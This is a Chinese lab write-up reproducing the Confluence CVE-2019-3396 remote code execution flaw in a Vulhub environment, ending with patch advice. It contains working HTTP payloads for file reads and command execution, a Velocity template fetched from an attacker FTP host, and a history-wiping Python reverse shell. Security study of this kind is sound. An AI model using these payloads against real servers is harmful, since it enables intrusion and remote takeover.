# 【Vulhub】CVE-2019-3396 Confluence RCE 漏洞复现 - Zh1z3ven - 博客园

> 原文：[`www.cnblogs.com/CoLo/p/13755525.html`](https://www.cnblogs.com/CoLo/p/13755525.html)

## CVE-2019-3396 Confluence RCE 漏洞复现

### 一、环境搭建

选择的 vulhub 里的镜像，进入 vulhub/Confluence/CVE-2019-3396 目录下，执行

```
docker-compose up -d 
```

镜像拉完后，访问 your-ip:8090 端口开始部署 confluence 服务

ps：

点击 Get an evaluation license ，准备获取一个 90day 的激活 keys。这里最好记住你的 Server ID 准备随时 ctrl cv

![image-20200930145917818](img/d27e1f292afaf97e229b98b1269078b7.png)

页面跳转后，如果没有 Atlassian 账户需要拿邮箱注册一个，验证完之后登录。

![image-20200930145728975](img/ae4aa19af5eaf35d57b00607c3655584.png)

![image-20200930145607365](img/0bf349eb4cc27cde1dbf92a4bb2b86a4.png)

![image-20200930150656507](img/b4dca34a1e75681d41cc9acb969bef63.png)

搭建完成。（个人还是比较喜欢这种简约的风格）

![image-20200930150927724](img/41201465e5decbd6a0b2ef592941272a.png)

### 二、漏洞利用

#### 1、读取外部 web.xml

利用 Bp 进行抓包，注意 Referer 字段最好用自己抓的包的值，vulhub 上提供的 payload 如下

```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: Your-ip:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://Your-ip:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&
Content-Type: application/json; charset=utf-8
Content-Length: 176

{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}} 
```

![image-20200930151645455](img/8940cc74c846744876e4fd1af7a3e138.png)

#### 2、利用 file 协议读取本地任意文件

6.12 以前的 Confluence 没有限制文件读取的协议和路径，我们可以使用`file:///etc/passwd`来读取文件，也可以通过`https://...`来加载远程文件。该文件是一个 Velocity 模板，我们可以通过模板注入（SSTI）来执行任意命令：

![image-20200930152752246](img/e25aa98fd7c8f73514fe3af59f71517a.png)

payload：

```
POST /rest/tinymce/1/macro/preview HTTP/1.1

Host: 192.168.124.153:8090

Accept-Encoding: gzip, deflate

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

Connection: close

Referer: http://192.168.124.153:8090/pages/resumedraft.action?draftId=65594&draftShareId=4fd7bbb3-230b-480e-9360-e02b65c602ad

Content-Type: application/json; charset=utf-8

Content-Length: 167

{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}} 
```

wireshark 流量

![image-20200930161328496](img/b6e5c6651f60cc59ab8f567803ea0669.png)

![image-20200930161408326](img/52aa8dcc81814bec44e2896741681f8f.png)

#### 3、实现 RCE excute command

主要原理是根据读文件的思路，远程包含 python 搭建的 ftp 服务器上的.vm 文件来创造执行命令的环境，进而实现 RCE。

python 开启 ftp

```
pip install pyftpdlib

python -m pyftpdlib -p  8888 
```

![image-20200930154706768](img/365a887e0b4700e78a9b00f6c9090b6e.png)

在开启 ftp 的当前目录下写入 r.vm 文件

r.vm

```
#set ($exp="exp")
#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($command))
#set ($input=$exp.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
#set($sc = $exp.getClass().forName("java.util.Scanner"))
#set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName("java.io.InputStream")))
#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
#if($scan.hasNext())
    $scan.next()
#end 
```

##### excute ifconfig

payload

```
POST /rest/tinymce/1/macro/preview HTTP/1.1

Host: 192.168.124.153:8090

Accept-Encoding: gzip, deflate

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

Connection: close

Referer: http://192.168.124.153:8090/pages/resumedraft.action?draftId=65594&draftShareId=4fd7bbb3-230b-480e-9360-e02b65c602ad

Content-Type: application/json; charset=utf-8

Content-Length: 205

{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"ftp://192.168.124.141:8888/r.vm","command":"ifconfig"},"body":""}} 
```

![image-20200930154912916](img/f8bc533e057fd53d53f88ba188765c48.png)

#### 4、反弹 shell

##### 复现失败 先鸽着~

payload

```
POST /rest/tinymce/1/macro/preview HTTP/1.1

Host: 192.168.124.153:8090

Accept-Encoding: gzip, deflate

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

Connection: close

Referer: http://192.168.124.153:8090/pages/resumedraft.action?draftId=65594&draftShareId=4fd7bbb3-230b-480e-9360-e02b65c602ad

Content-Type: application/json; charset=utf-8

Content-Length: 205

{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"ftp://10.10.20.166:8888/r.vm","command":"setsid python /tmp/nc.py 10.10.20.166 8989"},"body":""}} 
```

nc.py

```
# -*- coding:utf-8 -*-
#!/usr/bin/env python
"""
back connect py version,only linux have pty module
code by google security team
"""
import sys,os,socket,pty
shell = "/bin/sh"
def usage(name):
    print 'python reverse connector'
    print 'usage: %s <ip_addr> <port>' % name

def main():
    if len(sys.argv) !=3:
        usage(sys.argv[0])
        sys.exit()
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect((sys.argv[1],int(sys.argv[2])))
        print 'connect ok'
    except:
        print 'connect faild'
        sys.exit()
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    global shell
    os.unsetenv("HISTFILE")
    os.unsetenv("HISTFILESIZE")
    os.unsetenv("HISTSIZE")
    os.unsetenv("HISTORY")
    os.unsetenv("HISTSAVE")
    os.unsetenv("HISTZONE")
    os.unsetenv("HISTLOG")
    os.unsetenv("HISTCMD")
    os.putenv("HISTFILE",'/dev/null')
    os.putenv("HISTSIZE",'0')
    os.putenv("HISTFILESIZE",'0')
    pty.spawn(shell)
    s.close()

if __name__ == '__main__':
    main() 
```

### 三、修复建议

1、升级 Confluence 版本

2、主动升级 widgetconnector-3.1.3.jar 到 widgetconnector-3.1.4.jar

修复版本

```
 版本 6.6.12 及更高版本的 6.6.x.

    版本 6.12.3 及更高版本的 6.12.x

    版本 6.13.3 及更高版本的 6.13.x

    版本 6.14.2 及更高版本 
```

### 四、参考文章

[`github.com/jas502n/CVE-2019-3396`](https://github.com/jas502n/CVE-2019-3396)

[`www.dazhuanlan.com/2020/03/12/5e699fd90b28d/`](https://www.dazhuanlan.com/2020/03/12/5e699fd90b28d/)?**cf_chl_jschl_tk**=e8dd06011fdaf3156578789db783fb1e19334a17-1601445523-0-AdY5cinwXvy7C_ZK_GUCgYoYxD_U6KEMtMg1gw7ZuAw5iuw4yxQ8_rZ3f_PcBZs1SG56zvLKO_EqoXU-v3sZP_n9-62h4UsjOEY1GK88HfYnaujQ1WEe8ZOeUiw5iZrnTjKZ8d7690DID91z2O53gyy6gBvDPUwANWteegtlgEFyC9bvKiFwcgYOZh3Gn6pz0LtpvwssjznG5YXiavUBo9z8cpow7EwN6PqtyuIuGFI2iUC47sq56j2_QNYgai2DTSg55AV6B3ITEe0CFrZno3hB3ZTffuW0EnstoMAf66nA7u5LaU4W4atjxx9PgspQag

[`github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396`](https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396)

[`paper.seebug.org/884/`](https://paper.seebug.org/884/)

[`www.freebuf.com/news/200183.html`](https://www.freebuf.com/news/200183.html)